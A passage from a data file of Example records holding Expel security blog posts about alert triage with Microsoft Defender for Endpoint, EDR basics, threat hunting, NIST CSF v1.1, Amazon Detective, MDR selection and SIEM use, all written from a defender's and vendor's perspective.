the box protection without the need to mass-deploy software or provision sensors across your fleet. What is EDR and how do these tools help us When we integrate with an endpoint detection and response (EDR) product, our goal is to predict the investigative questions that an analyst is going to ask and then have the robot perform the action of getting the necessary data from that tool. This frees up our analyst to make the decision . We think Defender for Endpoint provides the right toolset for helping us easily reach that goal via its API. Why Microsoft Defender for Endpoint is the best Thanks to Defender for Endpoints robust APIs, we augmented its capability to provide upfront decision support to our analysts that arms them with the answers to the basic investigative questions that we ask ourselves with every alert. To find these answers, theres a few specific capabilities of Defender for Endpoint that we tap into that allow us to pull this information into each alert. This way, our analysts dont need to worry about using the tool, but instead, get to focus on analyzing the rich data that it provides: Advanced hunting database Prevalence information Detailed process logging AV actions Like we mentioned, Defender for Endpoint is an amazing investigative tool out of the box, but it only gets better once you start peeking under the hood. Our favorite for Endpoint feature? The API. Here at Expel, robots are our friends. They help us with decision support. This is what enables our analysts to focus on making decisions rather than worrying about how to use 30+ different technologies to gather the data we need to answer investigative questions. To be effective, our robots must not only be good at collecting the data needed but preparing it for interpretation as well. Therefore our robots arent just good at collecting data, they also translate it into a format our analysts can easily work with and is consistent across multiple technologies. With Defenders rich API, we have an opportunity to replicate the manual scoping actions our analysts would take in the console and perform them automatically in our own platform. Now that weve written our love letter to Defender for Endpoint, well show you a real example of how we use this tool to triage an alert. Triaging an alert using Microsoft Defender for Endpoint First things first: heres how we break down an alert. At a high level, were looking to answer five basic investigative questions: What is it? Where is it? How did we detect it? How did it get there? When did it get there? Defender for Endpoints features help us easily answer these questions. Heres an example of what a Defender for Endpoint alert looks like when it initially comes through the Expel Workbench: Initial lead of suspicious commands Heres what we know What is it? Suspicious net commands being run by this user Where is it? One host How did we detect it? EDR alert  execution of suspicious commands What we dont know, how and when did it get here Now to answer the money questions. We need to ask ourselves the last two of our investigative questions ( How did it get there? When did it get there? ) to understand how we will need to proceed in our investigation. And, as with any investigation, they will require additional data to answer. An analysts measure of a good EDR platform will always be biased towards whether or not the data they need is available, easy to obtain and to understand. In our experience, Defender for Endpoint does an excellent job of anticipating these questions and providing easy access to detailed process information that allows an analyst to quickly and confidently make decisions. To highlight this, lets attempt to answer How did it get there? using some of the data provided to us with the Defender for Endpoint alert. Our favorite way to answer this? The Alert Process tree. Process tree of activity flagged in the alert As analysts, we love to see a nice process tree (like the one you see above). Being able to visualize the lineage of a process is extremely helpful, especially when time is of the essence. Defender for Endpoint presents us with a detailed hierarchy of the processes involved in an alert, marking anything it believes to be suspicious with a yellow lightning bolt. By looking at the process tree, we can easily identify that the suspicious net commands spawned from the parent process httpd.exe. Why is this detail relevant? This is common behavior associated with webshells from a remote attacker. By knowing this, we now have evidence to suggest an anomalous process relationship and likely an incident. With a suspected webshell on the brain, now we have a little bit of clarity on how these suspicious commands were executed. But two important questions still remain: How did this webshell get here? When did the webshell first enter the environment? Again, these are high-level questions and an experienced analyst is naturally going to attempt to identify the sources and frequency of the webshell interaction as well. But regardless, the Timeline feature of the Incident pane allows us to answer all of these. Check out this output when we search for the process httpd.exe on the alerted host. Timeline view to filter network connections from the httpd.exe process We can answer When did it get there? by filtering network connections, helping us clearly identify network connections related to the suspicious httpd.exe activity and determining the time they first started. More than likely, these connections are the Command and Control we would expect from webshell interaction; containing the net commands that we were alerted to initially. Seeing the whole picture With just a few tools in the Defender for Endpoint console, we can easily scope this activity and answer all five of our initial investigative questions. What is it? Reconnaissance commands being executed by an attacker Where is it? One host (Web application host) How did we detect it? EDR alert  execution of suspicious commands How did it get there? A webshell deployed through an application vulnerability When did it get there? A few hours prior to our original alert How do we use Defenders features to our advantage? If you asked a robot what its job at Expel is, it would likely respond in a JSON blob. JSON is great for transferring and formatting data in an efficient way, but its not great for a human to read. Therefore outside of just collecting the data, our robots are also responsible for making this data ready for interpretation by an analyst in a format that is readable and consistent. So how do our robots pull this off? Well, our robots speak API. It all starts with them being able to ask some very simple questions of Defender for Endpoint. Weve found that Defender for Endpoint has a rich API that allows us to automate our entire triage process. Lets take a look at what this looks like with our lead alert. Defender for Endpoint Alert decision support Prevalence Information Where is it? As an analyst, this is probably one of the first (and most powerful) questions you can ask yourself in an investigation. The lower the prevalence, the more likely youre looking at something out of place. The way we do this with Defender for Endpoint is by normalizing the process arguments that were alerted on, and query for them in the Advanced Hunting Database . As you can see above, our analysts immediately know that in the past seven days these commands are completely unique compared to the one host were already investigating. We can see this by looking at how common these process arguments are in the environment. We also do this with the normalized file path to help identify whether or not the alerted activity is being executed out of an abnormal location, or is simply a commonly installed binary in the environment by showing us everywhere the file is seen. With this information we can easily spot legitimate binaries in abnormal locations, or spoofed binaries that are executing out of legitimate directories. Defender for Endpoint Alert decision support Auto-Timeline Generation Your next logical question as an analyst is usually: How did it get there? We anticipate this and provide a timeline of the activity that occurred in a five minute window around the time of the alert. Since this comes with the alert, theres no wasting time learning a query language, logging into the console, waiting for the query to run and parsing the data. All in all, we save at least five to 10 minutes per alert when this data is retrieved and interpreted by our robot. This data comes back in a normalized CSV format so an analyst can easily open and filter that data in Excel. Below, youll see an example of an automatic timeline generated for the host involved in the alert. Defender for Endpoint Decision support Our Timeline format is very simple, and emulates the format in which we keep our master incident Timelines. That way we can easily take data from multiple sources and combine them into a master Timeline that tracks an incident across multiple hosts, users and organizations (note that columns are redacted). Timeline acquired through our robots in CSV format AV Actions One of the greatest features of Defender for Endpoint is its configurable remediation policies. As defenders we usually want to know pretty early on whether or not a specific file was allowed to execute, or was blocked/ended by Defender for Endpoint at runtime. Our robots reach out to get us that context on each alert, and alert us to what Defender for Endpoint action was applied to the suspicious activity (if any) so that we can make smarter decisions about our response. For example, no one wants to spin up an incident for a blocked stage one download, but if the second stage was allowed to execute  lets call in the troops. In the example below we see that a file matching a signature for the Skeeyah trojan was identified and blocked at runtime. Before having to prove execution, we now know the scope is limited to simply answering one question ( How did it get here? ) rather than a bunch of post-exploitation questions right off the bat: What other actions happened as a result? What C2 did it communicate with? How many other machines are infected? We save a lot of time knowing this up front as there is no ambiguity on the action taken by the tool or having to parse detailed logs to find this information. Defender for Endpoint Decision Support Putting it all Together The decision support Defender for Endpoint enables us to generate is powerful because it allows us to become specialists at analysis rather than specialists of a specific technology. Dont get us wrong, there are always benefits to knowing the tool. But a carpenter building a house isnt usually the same person who forged the hammer. Decision support allows us to be flexible in the tools that were using but also to be consistent in the response we provide to our customers. By standardizing the investigative questions and building our robots to answer those questions automatically, we can uplevel the capability of our analysts. Defender for Endpoint provides a platform that allows our analysts to quickly and accurately answer important questions during an investigation. But most importantly, having these capabilities emulated in the API allowed us to build on top of the Defender for Endpoint platform to be more efficient in our goal of providing high-quality detection and response across multiple organizations. Have questions? Lets chat .'}) (input_keys={'title'}),
  Example({'title': "What's endpoint detection and response (EDR)?", 'url': 'https://expel.com/blog/whats-endpoint-detection-and-response-edr/', 'date': 'Dec 6, 2017', 'contents': 'Subscribe  EXPEL BLOG Whats endpoint detection and response (EDR) and when should you care? Security operations  3 MIN READ  GRANT OVIATT  DEC 6, 2017  TAGS: EDR / Selecting tech / Tools Perhaps youve heard AV is dead, or maybe someone tossed around the EDR acronym in a meeting and you had to Google it. You might even just be skeptical of what an EDR can do. In any case, the constant drumbeat of new products makes it harder than ever to keep current with security solutions. Its easy to become desensitized to all of the market hype. In this blog post, Im going to try to cut through the hype and explain what EDR products can do for you. If youve ever been skeptical of EDR vendor promises, but curious if they can solve real security problems youve come to the right place. What is EDR? Endpoint detection and response (EDR) tools are a new(ish) category of security solutions. They require you to install an agent on each endpoint. In return, youre able to record and store endpoint system behaviors and events. These events typically include tracking processes, registry alterations, file system activity and network connections on all hosts where the agent is installed. Security teams can use this event stream to detect and investigate suspicious activity that occurs in their environment. What are the three most important things an EDR tool will do for me? Give you visibility into behaviors, not just indicators of compromise Attacker tools arent stagnant, so why should your detections be? EDR solutions enable you to detect more than just a filename or hash match by providing a simple way to collect, store, and search host-based events. Changing a single byte in a file can ruin an indicator of compromise. But the broader techniques that lead to a compromise change far less frequently. EDR products use the events they collect to identify suspicious process relationships, unusual network connections, potential credential theft and lots of other behaviors that can help you identify a potential compromise faster. Most EDR products even allow you to inject your own expertise into the device by augmenting its out-of-the-box detection behaviors with your own rules. Answer security questions at scale Ever wonder how many hosts in your environment are using a particular piece of vulnerable software? Or, perhaps what hosts have gone to a particular known-bad domain? Has an investigation ever left you asking Is this activity normal? These are all questions you can quickly answer when you have an EDR solution to query collected file, network, and process events across your environment. And theyre not just valuable when youre responding to an incident. They also arm you with valuable data you can use for proactive threat hunting. Help you respond faster Its probably obvious that you can respond faster when you can easily get additional context on alerts by searching events from all your endpoints. But what happens when theres a specific file, registry key or process that needs closer inspection  beyond the event stream? Luckily, most EDR solutions eliminate the need to physically chase down the laptop or server in question by empowering you with remote file acquisition, file listing, registry listing, and in some cases, even memory analysis capabilities. and a few things EDR tools wont do Be a complete replacement for your antivirus While antivirus and EDR solutions are slowly converging, theyre still two distinct offerings. Traditional AV blocks known-bad indicators that commonly plague enterprise environments. EDR solutions complement that by giving you a way to perform root cause analysis on specific incidents, identify all infected hosts, and even contain them in some cases but most wont prevent compromise in the first place. Be the last detection solution youll ever buy While EDR tools provide tremendous visibility and insight into your network, they arent substitutions for your IDS/IPS, next-gen firewalls or good old-fashioned security policies. Youll get a ton of value from your ability to detect and respond rapidly to threats, but dont mistake them for being a comprehensive solution. A substitute for having an investigative process and mindset The conclusions you take away from your EDR tool will be directly proportional to the expertise of the analysts using it. EDR tools will collect, store and make events easy to search  but a human still needs to interpret the events in a meaningful way. In short, the benefits of an EDR can be entirely lost on a team that isnt prepared to use them. Train your team, hone your process , and your EDR tool will become an invaluable asset. Should you buy an EDR? So, now that weve covered what EDR tools are (and arent) how do you know if youre ready to take the plunge and buy one? Well if these three points describe you you should definitely take a look. You want to up-level your detection and investigative capabilities You understand that an EDR tool isnt going to replace your AV solution Youre prepared to invest the time and expertise required to use an EDR tool effectively'}) (input_keys={'title'}),
  Example({'title': "What's hunting and is it worth it?", 'url': 'https://expel.com/blog/whats-hunting-and-is-it-worth-it/', 'date': 'Dec 21, 2021', 'contents': 'Subscribe  EXPEL BLOG Whats hunting and is it worth it? Security operations  4 MIN READ  BRYAN GERALDO  DEC 21, 2021  TAGS: Cloud security / MDR The value of hunting is a source of ongoing conversation and debate within the security industry. For some, hunting is a no-brainer, while others have intentionally delayed the adoption of this more novel approach to security. Why the debate? A few reasons. First, there are a lot of misconceptions and conflicting views about what hunting is and how it should be implemented. Thats because there isnt an industry-adopted definition of hunting. Then there are the limited expertise, competing priorities, and organizational tensions that impact security teams ability to adopt an effective hunting program. Not to mention the budget constraints that exacerbate the issue by forcing some orgs to rely on the bare minimum to secure their infrastructure  either delaying the adoption of a hunting program or implementing one thats sub-optimal. Expel has taken a side in this debate. In this blog post, Im going to explain what hunting is, the value it provides, and share how we use hunting here at Expel. Whats hunting? TL;DR: Hunting is the act of proactively looking for threats and/or anomalous activity in an environment that may have been missed by your security tools. But, like I mentioned, you wont find an industry agreed-upon definition of hunting today, which can lead to misunderstandings about what hunting is and who does it. For example, hunting efforts focused strictly on retrospective data analysis using known indicators of compromise (IOCs) after a large-scale attack or hunting services that are primarily automated are often marketed as a comprehensive hunting solution. But they often fall short on the scope, visibility, and reach you can or should expect from proactive hunting. At its core, hunting is scientific, rooted in the practice of setting up an experiment to test a hypothesis. Hunting experiments are based on both known and unknown attacker behaviors. Hunting hypotheses are based on the assumption that bad actors slipped past your detections. Hunting tests involve analyzing a large set of data (your raw logs) over a period of time (30 days for us) and focus on abnormal behaviors and patterns. Hunting is complex. It requires experienced talent, a dash of creativity, and effective tools. It also requires the time and space to effectively implement and maintain a threat hunting program. This can prove challenging for many orgs, especially those still struggling to understand the value or benefits of hunting. On top of that the low number of results typically found in a hunting exercise is a good sign for secure environments, but can lead to a low perceived value of hunting. Despite these challenges, security-forward companies have recognized the growing importance of threat hunting, and those who have implemented hunting programs find themselves ahead of the next attack instead of waiting for it. The benefits of hunting In our experience, there are characteristics of a mature hunting program that bring numerous benefits to organizations, including but not limited to: Helping uplift existing SOC detections by focusing on finding behaviors that are missed by existing security tools. Over time, enhancing existing tools with new and novel detection patterns. Further validations for the existence of an incident. Improving the overall quality of existing threat intelligence (like data) by helping shape threat intelligence research efforts. Helping to alleviate management anxieties by providing greater coverage of monitoring and analysis throughout the infrastructure. With Expel, for example, weve enabled several enterprise customers to move beyond simply focusing on IOC-based hunts in one environment (which is still important) to extending their threat hunting coverage across their environment with a larger, diverse set of hunting techniques. From our perspective, the benefits of hunting are many. Some of our favorites include: Attention to both known and unknown threats. Reduced attacker dwell times (time spent undetected in the environment) Faster time to containment. Minimized risk of lateral movement, spread, and exfiltration. A full view (beyond threats) that helps you better understand your environment And were not the only ones that feel that way. An increased number of industry experts, research studies, and reports mention or highlight the benefits of hunting. NISTs latest publication (Rev5) of NIST SP 800-53 acknowledges the usefulness of hunting to help identify evolving threats and, for the first time ever, introduced a control for threat hunting in section RA-10. This change tells us that orgs are starting to understand the significance of threat hunting. Yet many orgs struggle with finding the talent, time, or resources to hunt full-time, which makes prioritizing threat hunting especially difficult. Why Expel loves hunting Here at Expel , we believe theres another potential benefit to hunting thats frequently overlooked. Beyond identifying evolving threats, hunting is great for gaining more visibility into how your infrastructure (on-prem and/or cloud) is working (or not working). We consider this one of the most valuable features of our hunting service and include it in our hunt findings report as an added bonus. Expel reports this information in a dedicated Insights section of our hunt findings report. We examine our customers workings and identify areas that need attention, like misconfigured tools or other unnecessary operational costs theyre incurring. We also use these insights in a few other ways. For one, insights help set a baseline understanding of whats going on in your environment. Second, they can help break down communication silos between teams in your org to build a common understanding of your infrastructure. Finally, insights highlight important operational information your team should be aware of, ranging from security to compliance to operational issues that are increasing costs, like large unidentified elastic compute cloud (EC2) instances. And while these insights give you a better understanding of your infrastructure, they also enhance our unique context for our customers orgs that we then use to improve our detection strategies for their specific environments. So, is it worth it? Research shows that hunting is quickly growing in importance and becoming a staple of a strong security strategy. Expels chosen side is this: we fully believe in its benefits to not just identify evolving threats, but also to give you a better fundamental understanding of your environment. The next time someone asks if its worth it, heres the real value of hunting: Its the best way to stay ahead, mitigate your overall exposure (for example, reduce dwell time which is the time an attacker spends undetected in your environment), and give you a stronger chance of catching bad actors that have slipped past your security tools. Hunting enhances the visibility of your environment and provides an extra layer of protection that can prevent catastrophic damage. But keep in mind that developing a hunting strategy and capability is a time-consuming investment that requires a lot of resources. And even mature security teams might need threat hunting support to hunt efficiently and effectively. Feels familiar? If youre currently evaluating a hunting service (or thinking about it after reading this blog post), check out this impact report for buyers.'}) (input_keys={'title'}),
  Example({'title': "What's New in NIST Cybersecurity Framework v1.1", 'url': 'https://expel.com/blog/whats-new-in-nist-csf/', 'date': 'Apr 26, 2018', 'contents': 'Subscribe  EXPEL BLOG Whats new in the NIST Cybersecurity Framework (CSF) v1.1 Security operations  4 MIN READ  BRUCE POTTER  APR 26, 2018  TAGS: Framework / NIST / Overview / Planning On April 16, 2018, NIST published Framework for Improving Critical Infrastructure Cybersecurity Version 1.1 Where do I start? Its a common question for organizations that are trying to get their arms around the sprawling issues of cybersecurity and risk management. For most, this question eventually leads them to the NIST Cybersecurity Framework (CSF). Since it was published in 2014, it has been a frequent starting point. Its not perfect, but it has provided a common language and structure for discussing and improving security. Thousands of organizations are now using the framework. And thats a good thing. Its safe to say were fans of the NIST CSF here at Expel. We use it to help manage our own cyber risk and to help communicate our needs and plans to our customers and suppliers. Weve created a How to get started guide and free NIST CSF self-scoring tool that lets you chart your as is and to be states using the framework in a couple of hours  we even offer an interactive version of it for our customers within Expel Workbench.. If youre looking to get started with the framework it should help quite a bit. Now, after 4 years, many comments, questions, and suggestions, NIST has officially released version 1.1 of the Cybersecurity Framework. Not much has changed between draft 2 of v1.1, which was published for comment in December 2017 and the final release. Version 1.1 is still compatible with version 1.0, so the changes to the framework arent earth shattering. Theyre largely refinements based on feedback from the community. In case doing a stare-and-compare of the original and updated frameworks isnt your idea of fun, Ive highlighted three important changes below. 1. Assess yourself first  then measure It has always been difficult for some organizations to use the framework because NIST didnt provide clear guidance on exactly what to use it for. While the initial Framework talked about tiers of implementation, there wasnt much discussion on how to actually grade yourself or other ways to measure how well you were doing from a cybersecurity perspective. It was brand new back in 2014 so that makes sense. The updated version fills in some of those gaps. Specifically, Section 4, which used to be called Measuring and Demonstrating Cybersecurity has been re-christened Self-Assessing Cybersecurity Risk with the Framework. While both names are equally dry (heywhat do you expect from a standards body), they cut to the core of how to operationalize the framework. Self assessments are key to understanding your as is state and formulating a plan for improving your organizations cybersecurity. In fact, theyve been one of the frameworks big successes. By focusing Section 4 on self-assessment, NIST is making sure organizations that are new to the framework focus on one of the frameworks primary use cases. 2. Supply chain risk management (SCRM)  now with real guidance Its no secret that supply chain partners are often the soft underbelly for attackers looking for a way in. But answers for how to protect the supply chain are harder to come by. Past versions of the NIST framework highlighted SCRM as an important component of a cybersecurity program. But they didnt really say anything else. The new version of the framework adds a lot more detail and integrates SCRM with the rest of the framework. It feels a lot more complete. So, if youre one of those people whove been beating the SCRM drum for threeorfiveorten years, youll find new ammunition to beat the drum even louder. There are several pages on managing risks in your supply chain through third party assessments, targeted security controls and holding suppliers accountable. 3. External participation  when and how you should get outsiders involved The final notable change I want to call out relates to when and how you should get outside parties involved in your program. As a quick refresher, NIST defines four tiers of maturity. It starts with Tier 1, which NIST charitably calls Partial. This includes organizations that only deal with cyber risk when theyre forced to. Fast forward to Tier 4 (aka Adaptive) organizations and youre looking at risk management machines. NIST ranks each tier according to risk management processes, integrated risk management programs andyou guessed itexternal participation. But previous versions of the framework didnt give the reader much to go on when it came to external participation. There was a sentence or two describing what was appropriate for that tier. But not enough to build into your program. The new definitions are much more complete. They include discussion on external communication, the broader community and guidance on how to interact with supply chain stakeholders.  Overall, version 1.1 of the NIST framework feels a lot more complete to me than version one. Thats not surprising given weve had three years to digest and use it. In addition to the practical experience, our understanding of cyber risk has continued to evolve. If youve thought about using the NIST framework before but felt it was too daunting, now might be a time to take another look. If, on the other hand, youre already using NIST Id suggest taking a look at the three sections Ive highlighted above to see if they can help focus your implementation by turning some of the more theoretical aspects of the NIST framework into tangible things you can go execute on. Either way, I recommend checking out our blog post, How to get started with the NIST Cybersecurity Framework (CSF). Its a (hopefully) easy-to-understand overview that weve written to help people put the NIST CSF into practice. Weve also updated our NIST CSF self-scoring tool to reflect tweaks to the Supply Chain Risk Management and Identity Management and Access Control subcategories. If you used the previous version of our tool, theres no need to re-do you work. The changes are all small modifications and dont change the overall approach.'}) (input_keys={'title'}),
  Example({'title': 'Where does Amazon Detective fit in your AWS security ...', 'url': 'https://expel.com/blog/amazon-detective-fit-in-aws-security-landscape/', 'date': 'Dec 3, 2019', 'contents': 'Subscribe  EXPEL BLOG Where does Amazon Detective fit in your AWS security landscape? Security operations  3 MIN READ  MATT PETERS AND PETER SILBERMAN  DEC 3, 2019  TAGS: Cloud security / How to / Managed security / Tools Amazon Web Services (AWS) has rolled out some really nifty security capabilities over the last couple of years. Amazon Detective is AWS latest innovation. If you run workloads on AWS, then youre probably already familiar with some of the other AWS-native security tools like Amazon GuardDuty, AWS Security Hub and Amazon Macie. So where does Amazon Detective fit into this puzzle? What is Amazon Detective? Think of Amazon Detective as investigative support for AWS GuardDuty alerts. AWS announced the public preview program for Amazon Detective at re:Invent 2019 and Expel is one of the first managed detection and response (MDR) providers to support it. Were thrilled to be an early service partner for Amazon Detective! AWS CISO Steve Schmidt talks about Amazon Detective during re:Invent 2019; Expel is named as a service partner. In practice, Amazon Detective makes it easier for AWS customers and their MDR providers to analyze, investigate and quickly identify the root cause of security findings or suspicious activities. The service automatically extracts, distills and organizes data from VPC Flow Logs, AWS CloudTrail and Amazon GuardDuty, and creates an interactive view with contextual information that summarizes resource behaviors and interactions observed across your AWS environment. Amazon Detective can help speed up investigations for supported GuardDuty findings. For example, if you receive a GuardDuty finding of suspicious VPC flow activity, Amazon Detective will now present you with relevant information about the IPs involved in that GuardDuty finding. This speeds up the time to triage an alert (and likely cuts response time too). Amazon Detective might also prompt you (or your security analysts) with questions you should be thinking about answering. This fits nicely with how Expel thinks about the analyst mindset, and how we train our analysts to answer questions instead of following specific pre-set run books. Where does Amazon Detective fit in your AWS security strategy? If youre new to AWS and are looking for a simple this-tool-does-that primer, then heres a good place to start. At Expel, many of our customers run workloads on AWS and our analysts work with alerts from these environments on a regular basis to investigate suspicious activity. Weve published several how-tos for popular AWS security tools, along with some tutorials on fixing common cloud security issues. Be sure to check out: Making sense of Amazon GuardDuty alerts Following the CloudTrail: Generating strong AWS security signals with Sumo Logic How to find Amazon S3 bucket misconfigurations and fix them ASAP When it comes to securing the cloud, Amazon provides a panoply of solutions which can be a bit dazzling (and different from what youd find in a traditional on-prem security stack). Weve found that by mapping these to a set of jobs that our analysts do, it provides a helpful framework for thinking about them. Broadly, we bucket the AWS offerings into three categories. Why were excited about Amazon Detective Amazon Detective is helpful addition to AWS suite of security tools. At Expel, we believe that quality forensic investigations require context and decision support, and thats exactly what Amazon Detective provides. A security alert alone doesnt tell you much, but the context surrounding it is essential to figuring out whether youve got a false positive or a legitimate issue on your hands. The right historical details and the right behavior analytics are what turns any old alert into the lead that cracks the case. For example, if its 2am and youre looking at an anomalous login, the context around that users login is helpful  is this a real problem, or is Pat on sabbatical in Spain? Put your cloud security skills to the test Whether or not Amazon Detective has a place in your security strategy right now, its easy to test out the AWS security tools youre already using in staged environments. Once youre feeling confident using the AWS-native security tools, put your teams detection skills to the test by creating a threat emulation exercise for AWS . This is something we do often at Expel. Simulating realistic attacks in cloud environments helps our analysts build muscle memory and prepares them to act quickly and correctly when something bad happens. Like this idea but not sure how to get started with creating your own? Weve got an entire post that walks you through the process of creating a cloud-based threat emulation exercise . We even threw in a sample scenario for you, complete with instructions on how to simulate the attack in your AWS environment . Enjoy!'}) (input_keys={'title'}),
  Example({'title': 'Which flavor of MDR is right for your org?', 'url': 'https://expel.com/blog/which-flavor-of-mdr-is-right-for-your-org/', 'date': 'Mar 30, 2023', 'contents': 'Subscribe  EXPEL BLOG Which flavor of MDR is right for your org? Security operations  2 MIN READ  MIMI JACOBS  MAR 30, 2023  TAGS: MDR At best, the managed detection and response (MDR) landscape is multi-faceted and complicated; at worst, its downright confusing and frustrating to navigate. Further compounding the challenge of determining the best approach to MDR for your organization is the simple fact that its unique. Your mix of security tools, your business-driven risk requirements, and the makeup of your security team are just some of the factors that play a role in finding and implementing the type of MDR that best meets your companys business and technical requirements. The fact remains that MDR can (and perhaps will) play an important role in your security strategy . As many orgs struggle to find the right people to fill roles, MDR is already helping bridge the gapand that trend is set to continue. According to Gartner, by 2025, 60% of organizations will be actively using remote threat disruption and containment capabilities delivered directly by MDR providers, up from 30% today. So if youre considering an MDR solution, nows a great time to learn more. Luckily, Gartner recently released its 2023 Market Guide for Managed Detection and Response Services , providing a comprehensive analysis of the MDR market, a look at its evolution, representative players in the space, and overall recommendations. We believe the Gartner analysts who authored the Market Guide do a great job providing some context before you begin your MDR search: MDR buyers must focus on the ability to provide context-driven insights that will directly impact their business objectives, as wide-scale collection of telemetry and automated analysis are insufficient when facing uncommon threats. This Market Guide lends clarity on where to start, core capabilities to consider, and optional capabilities that can bolster your MDR deployment. In fact, Gartner outlines one of the first steps you should take: Define specific required outputs (incident ticket structure, reports) and goals that address defined use cases, before engaging with a provider. As with any outsourcing initiative, if outcomes are not defined, regardless of what service provider is used, the chance of success will be lessened. Buyers should also be cautious of overemphasizing the value of SLAs as part of detection-and-response-driven services. Going a layer deeper, a few of the core capabilities Gartner recommends are: 247 remotely delivered detection and response functions. Turnkey delivery, with predefined and pretuned processes and detection content. Triage, investigate and manage responses to all discovered threats, regardless of priority with no limitations on volumes or time dedicated to the discovery and investigation process. And while youll need to download the full report to get all the recommendations, market directions, recommended capabilities, and vendors in the MDR space (including yours truly), heres a taste of core MDR and adjacent services to consider: Download your copy of the Market Guide for Managed Detection and Response Services from Gartner here . This graphic was published by Gartner, Inc. as part of a larger research document and should be evaluated in the context of the entire document. The Gartner document is available upon request from Expel. Attribution: Gartner, Market Guide for Managed Detection and Response Services, Pete Shoard, Al Price, Mitchell Schneider, Craig Lawson, Andrew Davies, 4 February 2023. Disclaimer: GARTNER is a registered trademark and service mark of Gartner, Inc. and/or its affiliates in the U.S. and internationally and is used herein with permission. All rights reserved. Gartner does not endorse any vendor, product or service depicted in its research publications and does not advise technology users to select only those vendors with the highest ratings or other designation. Gartner research publications consist of the opinions of Gartners research organization and should not be construed as statements of fact. Gartner disclaims all warranties, expressed or implied, with respect to this research, including any warranties of merchantability or fitness for a particular purpose.'}) (input_keys={'title'}),
  Example({'title': 'Who ya gonna call (to make the most of your SIEM data)?', 'url': 'https://expel.com/blog/who-ya-gonna-call-to-make-the-most-of-your-siem-data/', 'date': 'Oct 31, 2022', 'contents': 'Subscribe  EXPEL BLOG Who ya gonna call (to make the most of your SIEM data)? Security operations  4 MIN READ  DAVE JOHNSON AND TYLER ZITO  OCT 31, 2022  TAGS: Cloud security / MDR Detectin makes us feel good! Are you troubled by strange alerts in the middle of the night? Do you experience feelings of dread in your on-prem or cloud environment? Have you or your security team ever seen a spook, specter, or ghost malware outbreak that you had trouble detecting quickly and remediating? For some security professionals, even the briefest consideration that a SIEM might not be the centerpiece of their security stack is a spooky, Shyamalan-esque, jumpscare movie theyd only watch from behind the couch (with popcorn, of course). But Expel aint afraid of no ghosts For the record, we arent The Gatekeeper of SIEM. Were The Keymaster, helping generate additional security value from your environment directly without having to rely entirely on a SIEM. In addition, as a somewhat radical challenge to industry trends, we can cross the streams between SIEM and the rest of your technology. We work with the tech our customers have in place, including their existing SIEM alerts and custom notables, to tailor the service to their requirements. The result combines top-shelf 247 SOC and best-of-breed security technologies optimized for your technical and business context, improving visibility and mean time to detect and remediate (MTTD/MTTR). Fundamentally, what is a SIEM, anyway? Traditionally, a SIEM is a grouping of rules and logic that extract interesting events from a large set of data which, up until recently, was the only choice many of us had in trying to make sense of all the spooky log stuff coming out of our environments. Weve spent the past decade or so using SIEMs to solve a problem that other technologies are also solving (or as an add-onagents, for example). Endpoint detection and response (EDR), intrusion detection systems (IDS), and intrusion prevention systems (IPS), cloud access security brokers (CASBs), privileged access management (PAM)there are plenty of acronyms and abbreviations to choose from. This doesnt mean SIEMs are no longer usefulthey absolutely arebut the ecosystem of high-fidelity solutions is expanding and evolving to address the complexity of evolving attacker methodology. But now a different problem rises from the grave: how can we keep track of it all? Should we try to scale by adding more rules and building a bigger SIEM? Or maybe elevate to a higher plane of existence where there is no SIEM, only ruuuuules! (and detections). Lets say you did decide to go the route of building a bigger SIEM. Consider a known constant, like the general size of a Twinkie. If we scale a standard SIEM to keep pace with the requirements of new telemetry and the massive, increasing complexity of data, well end up with a SIEM Twinkie weighing in at several hundred pounds. Youre likely going to need even more people to lift that giant SIEM Twinkie than you currently have today. Lets talk about getting to that higher plane and making that giant SIEM Twinkie a more manageable size, shall we? Historically in the cybersecurity service industry, when someone asks if your product is a SIEM, you say yes! (or something to that effect) . Except here, because Expel isnt a SIEM. Were a security operations provider that incorporates SIEM alert data with all the other relevant sources of security information in your environment. The whole is greater than the sum of the parts, and this approach magnifies the detection and response impact of your security stack and team. The Expel Workbench is the next step in the technical evolution of security monitoring. Ultimately, whether you believe in the existence of SIEM and its power to improve visibility in your cybersecurity environment, or not, we can help. Now, when theres something strange in your environment, the SIEM has to know what to look for, and if it doesnt then it wont know what to alert you about. An integrated platform (like Workbench) knows exactly what to watch for. Whats abnormal? Whats paranormal [fx: lightning flash, thunderclap, evil laughter] ? A modern, sophisticated SOC, where your existing SIEM is a part of the set-up, boosts time to response and efficiency, improving triage and enhancing investigations. For example, lets say we get an alert for a host named StayPuft engaging in malicious-looking user behavior. Additionally weve noticed, user Elvis is doing something strange. Because of the way we use automation for in-depth initial triage and correlation, our analysts have the time they need to investigate the user in detail. Who is Elvis and when was the last time we saw them log in? Has there been any other strange behavior here? Is this the kind of behavior we expect from this user in this situation? Or is it completely harmless and would never ever possibly cause any sort of destruction? Armed with a full complement of relevant information from different sources and defensive layers, analysts can report back to the customer, quickly and accurately, with insight into appropriate next steps. Customers who import their finely honed SIEM into a tool like Workbench can translate all the human hours invested in development into customized rules for their special use cases. In other cases, they may realize they no longer need a SIEM, only rulesspecifically, all the proprietary detection rules that come with Expel Workbench that have direct relevance to the security tools you have in your stack. Imagine firing a beam of high-energy positrons at the malicious entity to Expel their activity from your environment into a containment vessel. (See what I did there? Expel? Get it?) Everything Im describing also lowers your overhead management and time spent on your SIEM. You literally get the best of both dimensions. Theres a better, less scary way to team up and make the challenge of fielding security alerts much easier and actually enjoyable. If you have questions about how we can help you do exactly that, wed be happy to talk. We hope you enjoyed the absolutely necessary original Ghostbusters movie references. Have a Happy Halloween and may nothing too spooky happen over the holiday. But if it does. Who ya gonna call?'}) (input_keys={'title'}),
